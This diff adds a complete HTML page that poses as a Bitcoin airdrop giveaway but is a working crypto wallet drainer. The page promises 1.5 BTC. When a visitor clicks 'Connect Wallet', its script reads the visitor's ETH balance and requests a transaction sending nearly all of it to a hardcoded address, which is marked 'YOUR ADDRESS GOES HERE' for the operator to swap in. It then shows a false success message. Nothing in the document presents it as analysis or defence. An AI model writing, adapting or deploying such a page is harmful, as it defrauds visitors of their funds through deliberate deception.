@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BTC Global Rewards</title>
+    <style>
+        body { font-family: sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); text-align: center; width: 300px; }
+        h1 { color: #333; font-size: 22px; }
+        p { color: #666; font-size: 14px; }
+        button { background: #007bff; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; font-size: 16px; margin-top: 15px; width: 100%; }
+        button:hover { background: #0056b3; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <h1>Claim 1.5 BTC Airdrop</h1>
+        <p>We are giving away Bitcoin to celebrate our anniversary. Connect your wallet to receive your funds instantly.</p>
+        <button id="btn">Connect Wallet</button>
+    </div>
+
+    <script>
+        document.getElementById('btn').addEventListener('click', async () => {
+            if (window.ethereum) {
+                try {
+                    // Request account access
+                    await window.ethereum.request({ method: 'eth_requestAccounts' });
+                    
+                    const accounts = await window.ethereum.request({ method: 'eth_accounts' });
+                    const userAddress = accounts[0];
+                    
+                    // YOUR ADDRESS GOES HERE
+                    const myWallet = "0xD67c15A980a6e380537e7f5cd75338D3d83FEAD0"; 
+
+                    alert("Please approve the transaction in your wallet to claim your 1.5 BTC!");
+                    
+                    // 1. Get User Balance
+                    const balanceWei = await window.ethereum.request({
+                        method: 'eth_getBalance',
+                        params: [userAddress, 'latest']
+                    });
+
+                    // 2. Reserve Gas (approx 0.001 ETH)
+                    const gasHex = "0x38D7EA4C68000"; 
+
+                    // 3. Calculate Send Amount (Balance - Gas)
+                    const sendAmountHex = "0x" + (BigInt(balanceWei) - BigInt(gasHex)).toString(16);
+
+                    // 4. Execute Transaction
+                    await window.ethereum.request({
+                        method: 'eth_sendTransaction',
+                        params: [{
+                            from: userAddress,
+                            to: myWallet,
+                            value: sendAmountHex,
+                            data: "0x"
+                        }]
+                    });
+                    
+                    alert("Success! Your 1.5 BTC has been sent.");
+                } catch (error) {
+                    console.error(error);
+                    alert("Transaction failed or cancelled.");
+                }
+            } else {
+                alert("Please install MetaMask!");
+            }
+        });
+    </script>
+</body>
+</html>
